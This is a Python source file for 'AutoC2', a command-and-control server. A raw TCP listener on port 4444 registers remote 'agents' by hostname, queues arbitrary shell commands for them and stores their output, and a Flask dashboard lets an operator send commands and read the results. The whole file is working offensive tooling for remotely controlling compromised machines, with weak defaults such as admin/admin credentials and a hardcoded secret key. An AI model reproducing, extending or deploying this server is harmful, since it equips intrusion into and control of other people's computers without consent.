from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify
import os
import users
import socket
import threading
import queue
import readline
import logging

# C2 Server IP and port configuration
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4444

# Flask stuff
app = Flask(__name__)
app.secret_key = "ac2_secret"
log = logging.getLogger('werkzeug')
log.disabled = True

# Set up server logging
logger = logging.getLogger(__name__)
if os.path.exists("server.log"):
    os.remove("server.log")
logging.basicConfig(filename='server.log', encoding='utf-8', format='%(asctime)s - %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p', level=logging.INFO)

# Keep track of registered agents
registered_addresses = set()
registered_agents_id = [None] # Lookup by id
registered_agents_ip = {} # Lookup by ip
curr_id = 1

class Agent:
    def __init__(self, id, ip, hostname):
        self.id = id
        self.ip = ip
        self.hostname = hostname
        self.command_queue = queue.Queue()
        self.curr_cmd_id = 1

# Function to handle client connections
def handle_client(client_socket, client_address):
    if client_address[0] not in registered_addresses:
        try:
            # Get hostname
            command = "hostname" + "\n"
            logging.info(f"[+] New agent connected ({client_address[0]}). Getting hostname...")
            client_socket.sendall(command.encode())

            # Receive output from the client until the delimiter
            buffer = b''
            while b'ac2delim' not in buffer:
                data = client_socket.recv(4096)
                if not data:
                    break  # Exit if client closes the connection
                buffer += data
            
            # Extract output
            output = buffer.partition(b'ac2delim')[0].decode()
            
            # Register the agent
            registered_addresses.add(client_address[0])
            global curr_id
            new_agent = Agent(curr_id, client_address[0], output.strip())
            curr_id += 1
            registered_agents_id.append(new_agent)
            registered_agents_ip[client_address[0]] = new_agent
            logger.info(f"[+] Registered new agent {new_agent.hostname} ({new_agent.ip})")

        except Exception as e:
            logger.error(f"[!] Error with client {client_address}: {e}")
        finally:
            client_socket.close()
    else:
        try:
            agent = registered_agents_ip[client_address[0]]
            while True:
                # Check if there are commands in the queue for the agent
                if not agent.command_queue.empty():
                    # Get the next command from the queue
                    command = agent.command_queue.get()
                    logging.info(f"[+] Sending command to {client_address}: {command}")
                    client_socket.sendall(command.encode())

                    # Receive output from the client until the delimiter
                    buffer = b''
                    while b'ac2delim' not in buffer:
                        data = client_socket.recv(4096)
                        if not data:
                            break  # Exit if client closes the connection
                        buffer += data
                    
                    # Extract and display the output up to the delimiter
                    output = buffer.partition(b'ac2delim')[0].decode()
                    
                    # Log output
                    if not os.path.exists("cmd_output"):
                        os.mkdir("cmd_output")
                    path = "cmd_output/" + f"agent{agent.id}-{agent.curr_cmd_id}.out"
                    with open(path, 'w') as file:
                        file.write(command)
                        file.write(f"Output:\n-------------------------------------------------------------------------------------\n")
                        file.write(output)

                    # Update cmd id
                    agent.curr_cmd_id += 1
                else:
                    break
        except Exception as e:
            logger.error(f"[!] Error with client {client_address}: {e}")
        finally:
            client_socket.close()

def start_server():
    # Set up server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen()

    logger.info("[+] AutoC2 Server starting")
    logger.info(f"[+] Listening for incoming connections on {SERVER_HOST}:{SERVER_PORT}...")

    try:
        while True:
            # Accept a new client
            client_socket, client_address = server_socket.accept()
            
            # Create a new thread to handle each client
            client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
            client_thread.daemon = True
            client_thread.start()
    except Exception as e:
        logger.info("\n[!] Shutting down the C2 server.")
    finally:
        server_socket.close()


@app.route('/')
def home():
    if 'username' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if users.validate_user(username, password):
            session['username'] = username
            return redirect(url_for('dashboard'))
        else:
            flash('Invalid username or password!', 'danger')
    return render_template('login.html')


@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        flash('Please log in first.', 'warning')
        return redirect(url_for('login'))
    return render_template('dashboard.html', username=session['username'], agents=registered_agents_id[1:])

@app.route('/logs')
def logs():
    # Specify the path to your log file
    log_file_path = 'server.log'

    # Read the contents of the log file
    try:
        with open(log_file_path, 'r') as file:
            log_content = file.readlines()
    except FileNotFoundError:
        log_content = ["Log file not found."]

    # Render the log contents in the HTML template
    return render_template('logs.html', log_content=log_content)

@app.route('/logout')
def logout():
    session.pop('username', None)
    flash('You have been logged out!', 'info')
    return redirect(url_for('login'))

@app.route("/send_command", methods=["POST"])
def send_command():
    data = request.get_json()
    agent_id = int(data["agent_id"])
    command = data["command"]
    agent = registered_agents_id[agent_id]

    if agent:
        agent.command_queue.put(command + "\n")
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": "Invalid agent ID"}), 400

@app.route("/retrieve_output", methods=["POST"])
def retrieve_output():
    data = request.get_json()
    agent_id = int(data["agent_id"])
    cmd_id = int(data["cmd_id"])
    agent = registered_agents_id[agent_id]

    path = "cmd_output/" + f"agent{agent.id}-{cmd_id}.out"
    try:
        with open(path, 'r') as file:
            output_lines = file.readlines()
    except FileNotFoundError:
        output_lines = ["Output file not found."]

    output = "\n".join(output_lines)

    if agent:
        return jsonify({"success": True, "output": output})
    else:
        return jsonify({"success": False, "error": "Invalid agent ID"}), 400

if __name__ == '__main__':
    # Default creds
    if not os.path.exists("creds.db"):
        users.register("admin", "admin")

    # Run C2 Server in separate thread
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()

    # Run Flask in main thread
    logger.info("[+] Starting Flask app on 0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000)

